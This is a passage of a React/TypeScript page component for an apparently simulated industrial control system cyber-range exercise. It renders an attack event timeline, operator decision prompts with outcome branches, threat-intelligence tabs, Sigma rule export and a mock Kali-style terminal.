                    className={`grid grid-cols-[4.5rem_1.25rem_minmax(0,1fr)_auto] sm:grid-cols-[6rem_2rem_minmax(0,1fr)_auto] items-start gap-3 sm:gap-4 py-5 sm:py-6 border-b border-rule cursor-pointer transition-colors ${
                      active
                        ? isBlocked
                          ? "bg-amber-500/15 border-amber-500/40 text-foreground"
                          : "bg-accent text-accent-foreground"
                        : isBlocked && past
                          ? "opacity-75 bg-muted/20 border-l-2 border-l-amber-400 pl-2"
                          : future
                            ? "opacity-40 hover:opacity-100"
                            : "hover:bg-muted/40"
                    }`}
                  >
                    <span
                      className={`font-mono text-xs sm:text-sm pt-1 ${
                        active
                          ? isBlocked
                            ? "text-amber-400 font-bold"
                            : "text-accent-foreground"
                          : "text-foreground/60"
                      }`}
                    >
                      T+{fmt(e.t)}
                    </span>
                    <span className="flex justify-center pt-2">
                      <span
                        className={`size-3 ${
                          e.status === "BLOCKED_AIRGAP"
                            ? "bg-amber-400 rotate-45"
                            : e.status === "PREVENTED_UPSTREAM"
                              ? "bg-sky-400 rounded-full"
                              : e.status === "PATCHED"
                                ? "bg-emerald-400"
                                : active
                                  ? "bg-accent-foreground"
                                  : past
                                    ? sevColor(e.sev)
                                    : "border border-rule bg-transparent"
                        }`}
                      />
                    </span>
                    <div className="min-w-0">
                      <div className="flex flex-wrap items-center gap-2">
                        <p
                          className={`mono-label truncate ${
                            active
                              ? isBlocked
                                ? "!text-amber-400"
                                : "!text-accent-foreground"
                              : ""
                          }`}
                        >
                          {e.tag} · {e.node.toUpperCase()}
                        </p>
                        {e.status === "BLOCKED_AIRGAP" && (
                          <span className="mono-label text-[10px] px-2 py-0.5 bg-amber-500/20 text-amber-400 border border-amber-500/50">
                            [AIR-GAP DEFENSE]
                          </span>
                        )}
                        {e.status === "PREVENTED_UPSTREAM" && (
                          <span className="mono-label text-[10px] px-2 py-0.5 bg-sky-500/20 text-sky-400 border border-sky-500/50">
                            [BLOCKED UPSTREAM]
                          </span>
                        )}
                        {e.status === "PATCHED" && (
                          <span className="mono-label text-[10px] px-2 py-0.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/50">
                            [PATCHED / ATTESTED]
                          </span>
                        )}
                      </div>
                      <p
                        className={`font-serif text-lg sm:text-xl mt-1 leading-snug ${isBlocked && past ? "line-through opacity-70" : ""}`}
                      >
                        {e.title}
                      </p>
                      {active && (
                        <div className="mt-3 space-y-2">
                          <p className="font-mono text-xs max-w-xl leading-relaxed">{e.desc}</p>
                          {e.statusDetail && (
                            <p className="font-mono text-xs text-amber-300 bg-amber-950/40 p-2 border border-amber-500/30 max-w-xl">
                              {e.statusDetail}
                            </p>
                          )}
                        </div>
                      )}
                    </div>
                    <span
                      className={`mono-label pt-1 ${
                        e.status === "BLOCKED_AIRGAP"
                          ? "!text-amber-400 font-bold"
                          : e.status === "PREVENTED_UPSTREAM"
                            ? "!text-sky-400 font-bold"
                            : e.status === "PATCHED"
                              ? "!text-emerald-400 font-bold"
                              : active
                                ? "!text-accent-foreground"
                                : ""
                      }`}
                    >
                      {isBlocked ? "BLOCKED" : e.sev}
                    </span>
                  </li>
                );
              })}
            </ol>
          </div>

          <div className="col-span-12 lg:col-span-5 bg-paper text-ink p-6 sm:p-8 lg:p-12">
            <p className="mono-label !text-ink/60">SECTION 03 — OPERATOR DECISIONS</p>
            <h2 className="display text-4xl sm:text-5xl md:text-6xl mt-3 leading-[0.9]">
              What would
              <br />
              <span className="italic font-serif normal-case tracking-tight">you</span> have done?
            </h2>
            <div className="mt-8 sm:mt-10 space-y-5 sm:space-y-6">
              {DECISIONS.map((d) => {
                const chosen = choices[d.id];
                const reached = t >= d.t;
                const chosenOpt = chosen ? d.options.find((o) => o.id === chosen) : null;
                return (
                  <div
                    key={d.id}
                    className={`border-b border-ink/20 pb-5 ${!reached ? "opacity-40" : ""}`}
                  >
                    <div className="grid grid-cols-[minmax(0,1fr)_auto] gap-3 mono-label !text-ink/60">
                      <span className="truncate">
                        T+{fmt(d.t)} · {d.trigger.toUpperCase()}
                      </span>
                      <span className="shrink-0 text-ink">
                        {chosen ? chosen : reached ? "PENDING" : "UPCOMING"}
                      </span>
                    </div>
                    <p className="font-serif text-lg sm:text-xl mt-2 italic">{d.question}</p>
                    {reached && !chosen && (
                      <button
                        onClick={() => {
                          setActiveDecision(d);
                          setPlaying(false);
                        }}
                        className="mt-3 mono-label border border-ink px-3 py-2 hover:bg-ink hover:text-paper transition-colors"
                      >
                        DECIDE →
                      </button>
                    )}
                    {chosenOpt && (
                      <p className="mt-3 font-mono text-xs text-ink/70 leading-relaxed">
                        → {chosenOpt.consequence}
                      </p>
                    )}
                  </div>
                );
              })}
            </div>
            <div className="mt-8 sm:mt-10 grid grid-cols-1 sm:grid-cols-2 gap-3">
              <button
                onClick={exportDossier}
                disabled={exporting}
                className="w-full bg-ink text-paper mono-label py-3 hover:bg-accent hover:text-accent-foreground transition-colors disabled:opacity-50 disabled:cursor-wait"
              >
                {exporting ? "RENDERING PDF…" : "EXPORT FRAME DOSSIER (PDF) ↓"}
              </button>
              <button
                onClick={share}
                className="w-full border border-ink mono-label py-3 hover:bg-ink hover:text-paper transition-colors"
              >
                COPY SHAREABLE REPLAY LINK ⎘
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* SECTION 04 — EXPLAINABLE AI & EMPIRICAL GROUND TRUTH BENCHMARKS */}
      <section
        data-reveal
        className="border-b border-rule bg-background py-16 sm:py-20 px-5 sm:px-6 lg:px-10"
      >
        <div className="mx-auto max-w-[1600px] space-y-8">
          <div className="flex flex-wrap items-baseline justify-between border-b-2 border-rule pb-6 gap-4">
            <div>
              <p className="mono-label text-accent">
                SECTION 04 — EXPLAINABLE AI & EMPIRICAL THREAT DIAGNOSTICS
              </p>
              <h3 className="display text-3xl sm:text-4xl lg:text-5xl mt-2">
                Ground Truth Telemetry & Causal Diagnostics
              </h3>
            </div>
            <div className="flex items-center gap-3">
              <span className="mono-label text-xs px-2.5 py-1 border border-rule bg-card text-foreground/80">
                SECTOR: {sector.toUpperCase()}
              </span>
              <span className="mono-label text-xs px-2.5 py-1 bg-accent text-accent-foreground font-bold">
                PURDUE L0–L3.5
              </span>
            </div>
          </div>

          <div className="w-full">
            <Suspense fallback={<SimPanelFallback label="EXPLAINABLE AI" />}>
              <ExplainableAIPanel
                sector={sector}
                activeEvent={activeEventObj}
                onRunCommand={(cmd) => {
                  setTerminalOpen(true);
                  setTerminalInput(cmd);
                  handleTerminalSubmit(undefined, cmd);
                }}
              />
            </Suspense>
          </div>

          {/* THE 3-PILLAR EMPIRICAL GROUND TRUTH COMMAND DECK */}
          <div className="w-full border-2 border-rule bg-card p-5 sm:p-6 space-y-6 shadow-comic font-mono text-xs">
            {/* Toolbar */}
            <div className="flex flex-wrap items-center justify-between border-b-2 border-rule pb-4 gap-4">
              <div className="space-y-1">
                <span className="mono-label text-xs text-accent font-bold tracking-wider uppercase">
                  EMPIRICAL DATASET REPOSITORIES
                </span>
                <p className="text-[11px] text-foreground/60">
                  REAL-TIME VALIDATION AGAINST HAICon TESTBED, 127 OTCAD ATTACK DOSSIERS, AND MITRE
                  FOR ICS
                </p>
              </div>

              {/* 3 Prominent Primary Pillars */}
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => setIntelTab("hai")}
                  className={`px-3 sm:px-4 py-2 text-xs font-bold uppercase transition-all cursor-pointer border-2 ${
                    intelTab === "hai"
                      ? "bg-accent text-accent-foreground border-black shadow-comic-sm"
                      : "bg-background text-foreground/80 border-rule hover:border-accent"
                  }`}
                >
                  [01] HAICON SENSOR REPLAY & DRIFT
                </button>
                <button
                  type="button"
                  onClick={() => setIntelTab("otcad")}
                  className={`px-3 sm:px-4 py-2 text-xs font-bold uppercase transition-all cursor-pointer border-2 ${
                    intelTab === "otcad"
                      ? "bg-accent text-accent-foreground border-black shadow-comic-sm"
                      : "bg-background text-foreground/80 border-rule hover:border-accent"
                  }`}
                >
                  [02] OTCAD 127 HISTORIC ATTACKS
                </button>
                <button
                  type="button"
                  onClick={() => setIntelTab("mitre")}
                  className={`px-3 sm:px-4 py-2 text-xs font-bold uppercase transition-all cursor-pointer border-2 ${
                    intelTab === "mitre"
                      ? "bg-accent text-accent-foreground border-black shadow-comic-sm"
                      : "bg-background text-foreground/80 border-rule hover:border-accent"
                  }`}
                >
                  [03] MITRE ATT&CK FOR ICS
                </button>

                <div className="h-6 w-px bg-rule mx-1 hidden sm:block" />
                <button
                  type="button"
                  onClick={() => setIntelTab("packets")}
                  className={`px-2.5 py-1.5 text-[11px] font-mono border transition-colors cursor-pointer ${
                    intelTab === "packets"
                      ? "bg-foreground text-background border-foreground font-bold"
                      : "border-rule text-foreground/60 hover:text-foreground"
                  }`}
                >
                  PACKETS
                </button>
                <button
                  type="button"
                  onClick={() => setIntelTab("guidance")}
                  className={`px-2.5 py-1.5 text-[11px] font-mono border transition-colors cursor-pointer ${
                    intelTab === "guidance"
                      ? "bg-foreground text-background border-foreground font-bold"
                      : "border-rule text-foreground/60 hover:text-foreground"
                  }`}
                >
                  PURDUE GUIDANCE
                </button>
              </div>
            </div>

            <Suspense fallback={<SimPanelFallback label={intelTab.toUpperCase()} />}>
              {/* Tab 1: Live SCADA Protocol Packet Inspector & Modbus Sigma Rule Viewer */}
              {intelTab === "packets" && (
                <div className="animate-fade-in space-y-3">
                  <div className="flex flex-wrap justify-between items-center gap-2 border-b border-rule pb-2">
                    <div className="flex items-center gap-2">
                      <span className="size-2 bg-accent inline-block animate-pulse" />
                      <span className="font-mono font-bold text-xs text-foreground">
                        INDUSTRIAL OT PROTOCOL ANALYZER
                      </span>
                      <span className="mono-label text-[10px] text-accent/80 border border-accent/30 px-1.5 py-0.5 bg-accent/5">
                        MODBUS-TCP / DNP3 / S7COMM
                      </span>
                    </div>

                    <div className="flex items-center gap-1 font-mono text-[10px]">
                      <button
                        type="button"
                        onClick={() => setPacketSubTab("hex")}
                        className={`px-2.5 py-1 border transition-colors cursor-pointer ${
                          packetSubTab === "hex"
                            ? "bg-foreground text-background border-foreground font-bold"
                            : "border-rule text-foreground/60 hover:text-foreground"
                        }`}
                      >
                        HEX DECODE
                      </button>
                      <button
                        type="button"
                        onClick={() => setPacketSubTab("sigma")}
                        className={`px-2.5 py-1 border transition-colors cursor-pointer flex items-center gap-1 ${
                          packetSubTab === "sigma"
                            ? "bg-accent text-accent-foreground border-accent font-bold"
                            : "border-rule text-foreground/60 hover:text-foreground"
                        }`}
                      >
                        <span className="size-1.5 bg-current inline-block" />
                        CORRELATED SIGMA RULE
                      </button>
                    </div>
                  </div>

                  {packetSubTab === "hex" ? (
                    <PacketInspector event={activeIdx >= 0 ? EVENTS[activeIdx] : null} t={t} />
                  ) : (
                    (() => {
                      const curEvt = activeIdx >= 0 ? EVENTS[activeIdx] : null;
                      const targetNodeObj = curEvt
                        ? NODES.find((n) => n.id === curEvt.node)
                        : NODES[0];
                      const curSigmaYaml = generateSigmaRule({
                        sector,
                        mitreId: curEvt?.mitreId || "T0855",
                        mitreTactic: curEvt?.tag || "Inhibit Response Function",
                        nodeId: targetNodeObj?.id || "plc-01",
                        nodeLabel: targetNodeObj?.label || "PRIMARY PLC CONTROLLER",
                        vendor: targetNodeObj?.vendor || "Siemens / Schneider",
                        eventType: curEvt?.tag || "MODBUS_COMMAND_INJECTION",
                      });

                      return (
                        <div className="border border-rule bg-card/50 p-3 space-y-3 font-mono text-xs">
                          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-rule/60 pb-2">
                            <div>
                              <span className="text-accent font-bold text-[11px] block">
                                // OT PROTOCOL SIEM DETECTION (ZEEK / SURICATA / SPLUNK)
                              </span>
                              <span className="text-[10px] text-foreground/60">
                                PROTOCOL FRAME:{" "}
                                <strong className="text-foreground">
                                  {curEvt?.tag || "ACTIVE FRAME"}
                                </strong>{" "}
                                · MITRE {curEvt?.mitreId || "T0855"}
                              </span>
                            </div>
                            <div className="flex gap-2">
                              <button
                                type="button"
                                onClick={() => {
                                  navigator.clipboard.writeText(curSigmaYaml);
                                  setCopiedPacketSigma(true);
                                  setTimeout(() => setCopiedPacketSigma(false), 2000);
                                }}
                                className="px-2.5 py-1 border border-rule bg-background text-[10px] font-bold text-accent hover:border-accent cursor-pointer"
                              >
                                {copiedPacketSigma ? "COPIED ✅" : "COPY YAML"}
                              </button>
                              <button
                                type="button"
                                onClick={() => {
                                  downloadSigmaRuleYml(
                                    `twinsec_modbus_sigma_${sector}_${curEvt?.mitreId || "T0855"}.yml`,
                                    curSigmaYaml,
                                  );
                                }}
                                className="px-2.5 py-1 bg-accent text-accent-foreground text-[10px] font-bold hover:bg-foreground hover:text-background cursor-pointer"
                              >
                                DOWNLOAD .YML ↓
                              </button>
                            </div>
                          </div>

                          <div className="relative">
                            <pre className="p-3 bg-black border border-rule text-[11px] text-foreground/90 overflow-x-auto max-h-56 leading-relaxed font-mono">
                              {curSigmaYaml}
                            </pre>
                          </div>

                          <div className="flex items-center justify-between text-[10px] text-foreground/50 pt-1">
                            <span>
                              MAPPED ICS ATT&CK: {curEvt?.mitreId || "T0855"} (UNAUTHORIZED COMMAND)
                            </span>
                            <span className="text-accent">
                              ZEEK SERVICE: {sector === "power" ? "dnp3" : "modbus"}
                            </span>
                          </div>
                        </div>
                      );
                    })()
                  )}
                </div>
              )}

              {/* Tab 2: Purdue Model & Kill Chain Phase Guidance */}
              {intelTab === "guidance" && (
                <div className="animate-fade-in space-y-2">
                  <PhaseGuidancePanel
                    sector={sector}
                    role="BLUE"
                    currentPhase="CONTAINMENT"
                    eventTagsSeen={activeEvents.map((e) => e.tag)}
                    onRunCommand={(cmd) => {
                      setTerminalOpen(true);
                      setTerminalInput(cmd);
                      handleTerminalSubmit(undefined, cmd);
                    }}
                  />
                </div>
              )}

              {/* Tab 3: CVE & CISA Sector Intelligence */}
              {intelTab === "cve" && (
                <div className="animate-fade-in space-y-2">
                  <CVEIntelPanel
                    nodeId={
                      selected ||
                      (activeIdx >= 0 ? EVENTS[activeIdx].node : NODES[0]?.id || "plc-3")
                    }
                    nodeLabel={
                      selected || (activeIdx >= 0 ? EVENTS[activeIdx].node.toUpperCase() : "PLC-3")
                    }
                    onClose={() => setSelected(null)}
                  />
                </div>
              )}

              {/* Tab 4: Attack Anatomy & 3 Attack Surfaces Reference */}
              {intelTab === "anatomy" && (
                <div className="animate-fade-in space-y-2">
                  <AttackAnatomyPanel
                    sector={sector}
                    adversary={exercise.adversary}
                    protocol={exercise.protocols}
                  />
                </div>
              )}

              {/* Tab 5: Real HAI Continuous Telemetry Replay & ML Ground-Truth Evaluation */}
              {intelTab === "hai" && (
                <div className="animate-fade-in flex justify-center">
                  <HaiReplayPanel
                    onClose={() => setIntelTab("packets")}
                    onApplyAdvisory={(adv) => {
                      setShareToast(`[ADVISORY APPLIED]: ${adv.incidentId}`);
                      setTerminalLogs((prev) => [
                        ...prev,
                        `[+] ADVISORY APPLIED: ${adv.summary}`,
                        `[*] MITRE Technique: ${adv.primaryTechnique?.name || "ICS Manipulation"}`,
                      ]);
                    }}
                  />
                </div>
              )}

              {/* Tab 6: MITRE ATT&CK for ICS STIX 2.1 Knowledge Base Explorer */}
              {intelTab === "mitre" && (
                <div className="animate-fade-in flex justify-center">
                  <MitreIcsExplorerPanel
                    onClose={() => setIntelTab("packets")}
                    onSelectTechnique={(tech) => {
                      setShareToast(`[TTP SELECTED]: ${tech.externalId} - ${tech.name}`);
                      setTerminalLogs((prev) => [
                        ...prev,
                        `[+] MITRE ICS TTP SELECTED: ${tech.externalId} - ${tech.name}`,
                        `[*] Tactics: ${tech.tactics.join(", ")}`,
                      ]);
                    }}
                  />
                </div>
              )}

              {/* Tab 7: OTCAD Historical Cyberattack Dossier Repository */}
              {intelTab === "otcad" && (
                <div className="animate-fade-in flex justify-center">
                  <OtcadBrowserPanel
                    onClose={() => setIntelTab("packets")}
                    initialIndustry={
                      sector === "power"
                        ? "Power and Utilities"
                        : sector === "water"
                          ? "Water/Waste Water"
                          : sector === "oil-gas"
                            ? "Petroleum"
                            : undefined
                    }
                    onSelectIncident={(inc) => {
                      setShareToast(`[CASE LOADED]: ${inc.name} (${inc.year})`);
                      setTerminalLogs((prev) => [
                        ...prev,
                        `[+] HISTORICAL PRECEDENT LOADED: ${inc.name} (${inc.year})`,
                        `[*] Sector: ${inc.industry} | Vector: ${inc.attackType}`,
                        `[*] Target: ${inc.targetComponent} | Consequence: ${inc.consequence}`,
                      ]);
                    }}
                  />
                </div>
              )}
            </Suspense>
          </div>
        </div>
      </section>

      {/* SECTION 05 — OUTCOME — branches with operator choices */}
      <section data-reveal className="relative border-b border-rule overflow-hidden">
        <img
          src={facility}
          alt=""
          className="absolute inset-0 h-full w-full object-cover opacity-25"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/80 to-background/40" />
        <div className="relative mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 py-20 sm:py-24 lg:py-36">
          <div className="flex flex-wrap items-baseline gap-x-6 gap-y-2">
            <p className="mono-label">SECTION 05 — OUTCOME</p>
            <p className="mono-label text-accent">BRANCH · {outcome.branch}</p>
          </div>
          <h2 className="display text-[14vw] sm:text-[12vw] lg:text-[160px] leading-[0.85] mt-5 sm:mt-6">
            {outcome.mw === 0
              ? "ZERO LOAD SHED."
              : `${outcome.impactFormatted} ${outcome.impactLabel}.`}
            <br />
            <span className="text-accent">{outcome.duration}.</span>
            <br />
            <span className="text-foreground/40">{outcome.alarms}.</span>
          </h2>
          <div className="grid grid-cols-12 gap-6 sm:gap-8 mt-12 sm:mt-16">
            <p className="col-span-12 md:col-span-5 md:col-start-2 font-serif text-xl sm:text-2xl italic leading-snug">
              {outcome.narrative}
            </p>
            <div className="col-span-12 md:col-span-4 md:col-start-8 grid grid-cols-3 gap-4 sm:gap-6 border-l-0 md:border-l border-rule md:pl-8">
              <Stat k="MTTD" v={outcome.mttd} big />
              <Stat k="MTTR" v={outcome.mttr} big />
              <Stat k="COST" v={outcome.cost} big />
            </div>
          </div>

          {/* Tactical Action Bar: Save Drill & Export Dossier */}
          <div className="flex flex-wrap items-center gap-4 mt-10 md:ml-[8.333%]">
            <button
              onClick={saveDrillToLedger}
              disabled={drillSaved}
              className="h-11 px-6 bg-accent text-accent-foreground border-2 border-black font-mono text-xs font-black uppercase shadow-[3px_3px_0px_#000000] hover:bg-lime-300 disabled:opacity-60 transition-all flex items-center gap-2 cursor-pointer active:translate-x-0.5 active:translate-y-0.5"
            >
              <FileSpreadsheet className="size-4 stroke-[2.5]" />
              <span>{drillSaved ? "DRILL SAVED TO DATABASE ✓" : "RECORD DRILL TO LEDGER"}</span>
            </button>

            <button
              onClick={exportDossier}
              disabled={exporting}
              className="h-11 px-6 bg-[#18181B] text-foreground border-2 border-rule font-mono text-xs font-bold uppercase shadow-[3px_3px_0px_#000000] hover:border-accent hover:text-accent transition-all flex items-center gap-2 cursor-pointer active:translate-x-0.5 active:translate-y-0.5"
            >
              <FileDown className="size-4 stroke-[2.5]" />
              <span>{exporting ? "GENERATING DOSSIER..." : "EXPORT DOSSIER (PDF)"}</span>
            </button>

            <Link
              to="/dashboard"
              className="h-11 px-6 bg-black text-foreground/80 border-2 border-rule font-mono text-xs font-bold uppercase shadow-[3px_3px_0px_#000000] hover:border-accent hover:text-accent transition-all flex items-center gap-2 cursor-pointer"
            >
              <span>VIEW IN OPERATOR DASHBOARD →</span>
            </Link>

            <Link
              to="/leaderboard/submit"
              className="h-11 px-6 bg-[#0a200a] text-accent border-2 border-accent font-mono text-xs font-black uppercase shadow-[3px_3px_0px_#000000] hover:bg-accent hover:text-black transition-all flex items-center gap-2 cursor-pointer"
            >
              <Trophy className="size-4 stroke-[2.5]" />
              <span>SUBMIT TO LEADERBOARD →</span>
            </Link>
          </div>
        </div>
      </section>

      {/* Share-link toast */}
      {shareToast && (
        <div
          className="fixed left-1/2 -translate-x-1/2 z-[70] bg-foreground text-background mono-label px-4 py-3 border border-accent shadow-2xl animate-fade-in max-w-[92vw] truncate"
          style={{ bottom: "calc(env(safe-area-inset-bottom) + 1.25rem)" }}
        >
          {shareToast}
        </div>
      )}

      {/* Floating Cyber Range CLI Terminal Trigger FAB */}
      <TerminalFAB isOpen={terminalOpen} onToggle={() => setTerminalOpen(!terminalOpen)} />

      {/* Minimalist Brutalist Cyber Range CLI Terminal */}
      <KaliTerminal
        terminalOpen={terminalOpen}
        setTerminalOpen={setTerminalOpen}
        terminalMaximized={terminalMaximized}
        setTerminalMaximized={setTerminalMaximized}
        terminalPos={terminalPos}
        isDragging={isDragging}
        handleDragStart={handleDragStart}
        terminalLogs={terminalLogs}
        terminalInput={terminalInput}
        setTerminalInput={setTerminalInput}
        handleTerminalSubmit={handleTerminalSubmit}
        t={t}
        compromisedCount={compromisedNodes.size}
        isolatedCount={isolatedNodes.size}
        patchedCount={patchedNodes.size}
        nodes={NODES}
      />

      {/* ASSET DOSSIER MODAL OVERLAY */}
      {selected && activeNode && (
        <NodeOverlay
          node={activeNode}
          sector={sector}
          onClose={() => setSelected(null)}
          compromised={compromisedNodes.has(activeNode.id)}
          isIsolated={isolatedNodes.has(activeNode.id)}
          isBlocked={blockedNodes.has(activeNode.id)}
          isPatched={patchedNodes.has(activeNode.id)}
          onToggleIsolate={() => {
            setIsolatedNodes((prev) => {
              const next = new Set(prev);
              if (next.has(activeNode.id)) {
                next.delete(activeNode.id);
                setShareToast(`ASSET ${activeNode.label} RECONNECTED TO OT BUS`);
              } else {
                next.add(activeNode.id);
                if (firstActionTime === null) setFirstActionTime(t);
                setShareToast(`ASSET ${activeNode.label} ISOLATED (AIR-GAPPED)`);
              }
              return next;
            });
            window.setTimeout(() => setShareToast(null), 3000);
          }}
          onTogglePatch={() => {
            setPatchedNodes((prev) => {
              const next = new Set(prev);
              if (next.has(activeNode.id)) {
                next.delete(activeNode.id);
                setShareToast(`ASSET ${activeNode.label} PATCH REVERTED`);
              } else {
                next.add(activeNode.id);
                if (firstActionTime === null) setFirstActionTime(t);
                setShareToast(`ASSET ${activeNode.label} FIRMWARE PATCHED`);
              }
              return next;
            });
            window.setTimeout(() => setShareToast(null), 3000);
          }}
          events={activeEvents.filter((e) => e.node === activeNode.id)}
          t={t}
          onJump={(jumpT) => {
            setT(jumpT);
            setSelected(null);
          }}
        />
      )}

      {/* OPERATOR DECISION PROMPT MODAL */}
      {activeDecision && (
        <DecisionOverlay
          decision={activeDecision}
          onChoose={(choiceId) => {
            const decId = activeDecision.id;
            setChoices((prev) => ({ ...prev, [decId]: choiceId }));
            if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);

            // Target node associated with active decision event
            const ev = EVENTS.find((e) => e.t === activeDecision.t);
            const targetId = ev ? ev.node : NODES[3]?.id || "plc-3";
            const targetLabel =
              NODES.find((n) => n.id === targetId)?.label || targetId.toUpperCase();

            // Auto-execute CLI logs and containment actions
            if (choiceId === "ACT") {
              setTerminalLogs((logs) => [
                ...logs,
                `┌──(kali㏌twinsec)-[~/cyber-range]`,
                `└─$ decide ${decId} ACT`,
                `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> ACT`,
                `[+] MANUAL OVERRIDE ISSUED: Setpoint overrides deployed to ${targetLabel}.`,
                `[*] Real-time physics telemetry & live dashboard metrics recalculated automatically.`,
              ]);
              setShareToast(
                `[DECISION EXECUTED]: ACT - Setpoint Override Issued to ${targetLabel}`,
              );
            } else {
              // DEFEND option
              setPatchedNodes((prev) => new Set([...Array.from(prev), targetId]));
              setIsolatedNodes((prev) => new Set([...Array.from(prev), targetId]));
              setTerminalLogs((logs) => [
                ...logs,
                `┌──(kali㏌twinsec)-[~/cyber-range]`,
                `└─$ decide ${decId} DEFEND`,
                `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> DEFEND`,
                `[+] DEFENSE ENFORCED: Cryptographic patch & air-gap isolation applied to ${targetLabel}.`,
                `[*] Downstream adversary cascade severed. Simulation clock resumed.`,
              ]);
              setShareToast(`[DEFENSE]: ${targetLabel} PATCHED & AIR-GAPPED`);
            }

            setActiveDecision(null);
            setPlaying(true); // Keep physics and live dashboard running continuously
          }}
        />
      )}

      {/* SIMULATION AUTH GATE MODAL */}
      <SimulationAuthGate
        isOpen={authGateOpen}
        sector={sector}
        onLoginSuccess={() => setAuthGateOpen(false)}
        onRegisterSuccess={() => setAuthGateOpen(false)}
        onContinueAsGuest={() => setAuthGateOpen(false)}
      />

      {/* PRE-SIMULATION MISSION BRIEFING OVERLAY MODAL */}
      {briefingOpen && (
        <MissionBriefing
          scenario={currentScenario}
          isModal
          onClose={() => setBriefingOpen(false)}
          onStartSimulation={() => {
            setBriefingOpen(false);
            setPlaying(true);
          }}
        />
      )}

      {/* SIEM SIGMA DETECTION RULE EXPORT MODAL */}
      {showSigmaModal && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#090c10] border border-accent p-5 max-w-2xl w-full max-h-[85vh] overflow-y-auto font-mono text-xs space-y-4 shadow-2xl">
            <div className="flex justify-between items-center border-b border-rule pb-2">
              <span className="text-accent font-bold uppercase tracking-wider text-sm">
                PRODUCTION SIEM SIGMA DETECTION RULE
              </span>
              <button
                onClick={() => setShowSigmaModal(false)}
                className="text-danger hover:bg-danger/20 border border-danger/40 px-2 py-0.5 font-bold cursor-pointer"
              >
                [CLOSE]
              </button>
            </div>
            <Suspense fallback={<SimPanelFallback label="SIGMA DETECTION RULE" />}>
              <SigmaRuleExport
                sector={sector}
                unmitigatedEvents={EVENTS.map((e) => ({
                  nodeId: e.node,
                  nodeLabel: e.node.toUpperCase(),
                  tactic: e.tag,
                  mitreId: e.mitreId || "T1692.001",
                  vendor: "Siemens S7 / Modbus RTU",
                }))}
              />
            </Suspense>
          </div>
        </div>
      )}
    </main>
  );
}

/* ------------------------------------------------------------------ */
/*  OUTCOME BRANCH LOGIC                                              */
/* ------------------------------------------------------------------ */

function computeOutcome(choices: Record<string, ChoiceId>) {
  // baseline = worst case
  let mw = 14;
  let mttdMin = 14;
  let mttrH = 48;
  let costM = 4.1;
  let physicsMul = 1;
  let acts = 0;

  for (const d of DECISIONS) {
    const c = choices[d.id];
    if (c === "ACT") {
      acts++;
      mw -= 5;
      mttdMin = Math.max(2, mttdMin - 4);
      mttrH = Math.max(6, mttrH - 14);
      costM = Math.max(0.4, costM - 1.2);
      physicsMul *= 0.6;
    } else if (c === "DEFER") {
      mw -= 1;
      mttrH -= 4;
      costM -= 0.3;
      physicsMul *= 0.9;
    }
  }
  mw = Math.max(0, Math.round(mw));

  const branch =
    acts === 0
      ? "A — BASELINE"
      : acts === 3
        ? "D — CONTAINED"
        : acts === 2
          ? "C — REDUCED"
          : "B — DEGRADED";
  const dossierId = `001${acts > 0 ? "-" + ["A", "B", "C", "D"][acts] : ""}`;
  const duration = mw === 0 ? "ZERO IMPACT" : `${Math.max(8, 96 - acts * 22)} SECONDS`;
  const alarms = acts >= 2 ? "ALARMS RAISED" : "ZERO ALARMS";
  const narrative =
    acts === 0
      ? "The SCADA console showed nothing wrong until the breaker latched. The twin saw it 14 minutes earlier."
      : acts === 3
        ? "Every prompt was answered. The twin's early warnings translated to action. The grid never knew."
        : "Partial intervention bent the curve. The cascade narrowed but did not break.";

  return {
    mw,
    duration,
    alarms,
    mttd: `${mttdMin}m`,
    mttr: `${mttrH}h`,
    cost: `$${costM.toFixed(1)}M`,
    branch,
    dossierId,
    narrative,
    physicsMul,
  };
}

/* ------------------------------------------------------------------ */
/*  TRANSPORT (Sticky Scrubber & Playback Controls)                   */
/* ------------------------------------------------------------------ */

function Transport({
  t,
  setT,
  playing,
  setPlaying,
  speed,
  setSpeed,
  displaySpeed,
  activeIdx,
  choices,
  events,
  decisions,
  total,
  onStep,
  onReset,
}: {
  t: number;
  setT: (n: number) => void;
  playing: boolean;
  setPlaying: (b: boolean) => void;
  speed: number;
  setSpeed: (n: number) => void;
  displaySpeed: number;
  activeIdx: number;
  choices: Record<string, ChoiceId>;
  events: Event[];
  decisions: Decision[];
  total: number;
  onStep?: () => void;
  onReset?: () => void;
}) {
  const pct = total > 0 ? (t / total) * 100 : 0;
  return (
    <section
      className="border-b-2 border-rule bg-[#09090c] sticky top-0 z-40 shadow-[0_4px_0_0_#000000]"
      style={{ paddingTop: "env(safe-area-inset-top)" }}
    >
      <div className="mx-auto max-w-[1600px] px-4 sm:px-6 lg:px-10 py-2.5 sm:py-3 flex flex-wrap items-center gap-3 sm:gap-6">
        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setPlaying(!playing)}
            className="size-10 sm:size-11 bg-accent text-accent-foreground border-2 border-black font-black text-sm sm:text-base flex items-center justify-center hover:bg-white transition-colors cursor-pointer shadow-[2px_2px_0px_#000000] active:translate-x-0.5 active:translate-y-0.5"
            aria-label={playing ? "Pause" : "Play"}
            title={playing ? "Pause timeline (Space)" : "Start real-time playback (Space)"}
          >
            {playing ? "❚❚" : "▶"}
          </button>
          {onStep && (
            <button
              type="button"
              onClick={onStep}
              className="size-10 sm:size-11 border-2 border-black bg-[#16161b] text-foreground mono-label text-xs hover:border-accent hover:text-accent transition-colors flex items-center justify-center cursor-pointer shadow-[2px_2px_0px_#000000] active:translate-x-0.5 active:translate-y-0.5"
              title="Step forward (+5s or next event)"
            >
              ⏭
            </button>
          )}
          {onReset && (
            <button
              type="button"
              onClick={onReset}
              className="size-10 sm:size-11 border-2 border-black bg-[#16161b] text-foreground mono-label text-xs hover:border-accent hover:text-accent transition-colors flex items-center justify-center cursor-pointer shadow-[2px_2px_0px_#000000] active:translate-x-0.5 active:translate-y-0.5"
              title="Restart timeline to T+00:00"
            >
              ↺
            </button>
          )}
        </div>
